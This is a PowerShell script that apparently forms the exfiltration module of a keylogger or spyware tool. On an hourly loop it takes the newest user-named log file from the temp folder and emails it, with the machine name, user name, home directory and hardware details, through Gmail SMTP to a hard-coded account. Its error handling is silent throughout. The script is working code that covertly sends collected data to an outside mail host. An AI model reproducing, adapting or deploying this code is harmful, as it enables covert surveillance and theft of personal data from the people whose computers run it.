$Global:Email = "myemail@email.com"
$Global:Password = "MyPassword"
$Interval = 60

function Copy-FileWithRetries {
    param (
        [string]$sourceFilePath,
        [string]$destinationFilePath,
        [int]$maxRetries = 5,
        [int]$waitTime = 2
    )

    $retryCount = 0
    while ($retryCount -lt $maxRetries) {
        try {
            Copy-Item -Path $sourceFilePath -Destination $destinationFilePath -Force
            return $true
        } catch {
            Start-Sleep -Seconds $waitTime
            $retryCount++
        }
    }
    return $false
}

function SendMail {
	param (
		[string]$Email = $Global:Email,
		[string]$Password = $Global:Password,
		[string]$LogFile = "$env:temp\$env:username.txt",
        [int]$MaxAttachmentSizeMB = 19 # Maximum allowed attachment size in MB
	)
	
    $Subject = "You got mail from $env:USERNAME!"
    $Body = @"
                This email has been sent from $env:COMPUTERNAME
                -----------------------------------------------------------------
                Computer Name: $env:computername
                User Name: $env:username
                Home Directory: $env:userprofile
                Operating System: $env:OS
                Processor: $env:PROCESSOR_ARCHITECTURE $env:PROCESSOR_IDENTIFIER

"@
	if (Test-Path $LogFile) { # Insert 50 lines of the log file into the mail body if existing
        $PreviewLines = Get-Content -Path $LogFile -TotalCount 50
        $Body += "Preview of the log file (first 50 lines):`r`n`r`n"
        $Body += "====================================`r`n"
        $Body += $PreviewLines -join "`r`n"
        $Body += "`r`n====================================`r`n"
        $Body += "`r`n`r`nEnd of preview."
    } else {
    }

    $SMTPServer = "smtp.gmail.com"
    $SMTPClient = New-Object Net.Mail.SMTPClient($SMTPServer, 587)
    $SMTPClient.EnableSSL = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Email, $Password)

    if (Test-Path $LogFile) { # Attaching log file if existing
        # Creating temporary file to attach since the .NET application locks the log file
        $LogFileName = [System.IO.Path]::GetFileName($LogFile)
        $LogFileDir = [System.IO.Path]::GetDirectoryName($LogFile)
        $TempFileName = "log_$LogFileName"
        $TempFile = [System.IO.Path]::Combine($LogFileDir, $TempFileName)

        $MailMessage = New-Object System.Net.Mail.MailMessage
        $MailMessage.From = $Email
        $MailMessage.To.Add($Email)
        $MailMessage.Subject = $Subject
        $MailMessage.Body = $Body
        if (Copy-FileWithRetries -sourceFilePath $LogFile -destinationFilePath $TempFile) {
            try {
                $Attachment = New-Object System.Net.Mail.Attachment($TempFile)
                $MailMessage.Attachments.Add($Attachment)
                $SMTPClient.Send($MailMessage)
            } catch {
            } finally {
                
                $Attachment.Dispose()
                # Clean up temporary file
                if (Test-Path $TempFile) {
                    Remove-Item -Path $TempFile -Force
                }
            }
        } else {
        }
    } else {
        $SMTPClient.Send($Email, $Email, $Subject, $Body)
    }
}

function Get-LatestLogFile {
    param (
        [string]$fullPath = "$env:temp\$env:username.txt"
    )

    # Ensure the file path is provided
    if (-not $fullPath) {
        return
    }

    # Extract directory, base name, and extension
    $logDirectory = [System.IO.Path]::GetDirectoryName($fullPath)
    $baseFileName = [System.IO.Path]::GetFileNameWithoutExtension($fullPath)
    $fileExtension = [System.IO.Path]::GetExtension($fullPath)

    # Ensure the directory exists
    if (-not (Test-Path $logDirectory)) {
        return
    }

    # Get all files that match the base name pattern
    $logPattern = "$baseFileName-*$fileExtension"
    $logFiles = Get-ChildItem -Path $logDirectory -Filter $logPattern

    if ($logFiles.Count -eq 0) {
        return
    }

    # Sort files by LastWriteTime to get the latest one
    $latestLogFile = $logFiles | Sort-Object LastWriteTime -Descending | Select-Object -First 1

    return $latestLogFile.FullName
}


function ScheduleMail {
	
	param (
		[int]$MinutesInterval = 60
	)
		$now = Get-Date
        $SecondsInterval = $MinutesInterval * 60
        $nextInterval = $now.AddMinutes($MinutesInterval - ($now.Minute % $MinutesInterval))
		$timeLeft = ($nextInterval - $now).TotalSeconds
        Start-Sleep -Seconds $timeLeft
        while ($true) {
            $latestLogFile = Get-LatestLogFile

            if ($latestLogFile) {
                SendMail -LogFile $latestLogFile
            } else {
            }
			Start-Sleep -Seconds $SecondsInterval
        }
}
